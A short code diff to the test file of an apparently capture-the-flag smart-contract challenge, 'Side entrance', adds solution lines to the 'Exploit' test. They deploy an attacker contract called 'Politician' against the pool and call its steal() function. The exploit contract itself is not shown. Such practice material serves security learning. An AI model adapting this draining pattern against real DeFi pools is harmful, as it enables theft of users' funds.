@@ -25,6 +25,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const Politician = await ethers.getContractFactory("Politician", attacker);
+        const politician = await Politician.deploy(this.pool.address, ETHER_IN_POOL)
+        politician.steal();
     });
 
     after(async function () {
